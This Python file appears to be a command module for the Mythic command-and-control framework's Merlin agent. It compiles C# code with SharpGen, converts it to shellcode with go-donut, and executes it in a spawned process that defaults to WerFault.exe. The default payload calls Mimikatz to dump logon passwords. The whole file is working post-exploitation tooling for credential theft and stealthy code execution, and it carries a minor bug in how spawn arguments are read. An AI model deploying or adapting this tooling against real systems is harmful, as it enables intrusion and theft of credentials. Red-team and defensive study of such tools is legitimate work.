
from CommandBase import *
import os
import json
import subprocess
from MythicResponseRPC import *

# Set to enable debug output to Mythic
debug = False


class SharpGenArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "code": CommandParameter(
                name="code",
                type=ParameterType.String,
                description="The CSharp code you want to execute",
                default_value="Console.WriteLine(Mimikatz.LogonPasswords());"
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="the child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                required=True
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="argument to create the spawnto process with, if any"
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)


class SharpGenCommand(CommandBase):
    cmd = "sharpgen"
    needs_admin = False
    help_cmd = "sharpgen"
    description = "Use the SharpGen project to compile and execute a .NET core assembly from input CSharp code"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@Ne0nd0g"
    argument_class = SharpGenArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        # Arguments
        # Shellcode bytes goes in the first spot
        # SpawnTo filepath goes in the second spot
        # SpawnTo arguments, if any, go in the third spot
        args = [sharpgen(task.args.get_arg("code")), task.args.get_arg("spawnto")]
        arguments = task.args.get_arg("spawnto")
        if arguments:
            args.append(arguments)

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("code")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(assembly, arguments):
    donut_args = ['go-donut', '--in', 'input.exe', '--exit', '2']
    if arguments:
        donut_args.append('--params')
        donut_args.append(arguments)

    # Write file to location in container
    with open('input.exe', 'wb') as w:
        w.write(assembly)

    result = subprocess.run(
        donut_args,
        stdout=subprocess.PIPE
    )

    donut_bytes = bytes
    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("input.exe")
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return base64.b64encode(donut_bytes).decode("utf-8")


def sharpgen(code):
    sharpgen_args = ['dotnet', '/opt/SharpGen/bin/release/netcoreapp2.1/SharpGen.dll', '-f', 'sharpgen.exe', code]

    result = subprocess.run(sharpgen_args, stdout=subprocess.PIPE)

    sharpgen_bytes = bytes

    # Read SharpGen output
    with open('/opt/SharpGen/Output/sharpgen.exe', 'rb') as output:
        sharpgen_bytes = output.read()

    # Close file
    output.close()

    # Remove file
    os.remove("/opt/SharpGen/Output/sharpgen.exe")

    return donut(sharpgen_bytes, "")

